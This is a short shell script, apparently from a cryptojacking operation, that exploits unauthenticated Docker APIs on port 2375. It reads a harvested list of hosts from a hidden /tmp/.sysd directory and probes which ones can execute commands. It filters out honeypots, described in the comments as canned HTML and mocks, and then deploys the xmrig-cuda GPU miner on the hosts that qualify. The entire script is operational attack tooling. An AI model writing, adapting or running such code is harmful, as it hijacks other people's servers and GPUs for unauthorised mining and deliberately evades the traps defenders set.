#!/bin/sh
# throwaway: exec-probe every gpu_ok host, then deploy on the intersection.
# Why: gpu_ok is cheap (create-only) and is the only census that scales, but 133
# hosts already proved to be canned HTML and more mocks will happily answer "yes"
# to DeviceRequests. So gpu_ok alone is a *candidate* list; exec_ok is the scarce,
# decisive bit. This orders the two correctly: classify first, deploy only where
# both hold, so a 2-3GB xmrig-cuda pull never lands on a host that runs nothing.
awk -F'\t' '$2=="gpu_ok"{print $1}' /tmp/.sysd/.hunt/dock.cls 2>/dev/null | sort -u > /tmp/_gpuok.txt
echo "gpu_ok_candidates=$(wc -l < /tmp/_gpuok.txt)"
echo "== exec pass over candidates"
sh /tmp/.sysd/dockcls.sh exec /tmp/_gpuok.txt
echo "== exit-code readout of anything deployed"
for ip in $(awk -F'\t' '$2=="exec_ok"{print $1}' /tmp/.sysd/.hunt/dock.cls 2>/dev/null | sort -u); do
    printf '%s gpu=%s ' "$ip" "$(grep -c gpu_ok /tmp/.sysd/.hunt/dock.cls 2>/dev/null | head -1)"
    st=$(curl -sS -m 5 "http://$ip:2375/containers/kwgpu/json" 2>/dev/null)
    printf 'state=%s exit=%s\n' \
        "$(printf %s "$st" | grep -o '"Status":"[^"]*"' | head -1)" \
        "$(printf %s "$st" | grep -o '"ExitCode":[0-9-]*' | head -1)"
done
echo "== deploy pass (exec_ok AND gpu_ok)"
sh /tmp/.sysd/dockcls.sh deploy
echo "== classification"
cut -f2 /tmp/.sysd/.hunt/dock.cls | sort | uniq -c | sort -rn | head -8
date -u
